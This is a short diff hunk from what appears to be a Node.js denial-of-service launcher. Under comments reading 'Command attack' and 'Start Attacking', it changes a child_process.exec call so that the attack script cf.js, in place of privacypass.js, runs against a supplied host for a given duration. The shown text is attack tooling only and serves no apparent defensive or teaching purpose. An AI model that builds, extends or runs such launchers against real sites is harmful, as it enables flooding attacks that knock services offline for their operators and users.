@@ -24,7 +24,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node privacypass.js ${host} ${duration}`, (error, stdout, stderr) => {
+exec(`node cf.js ${host} ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
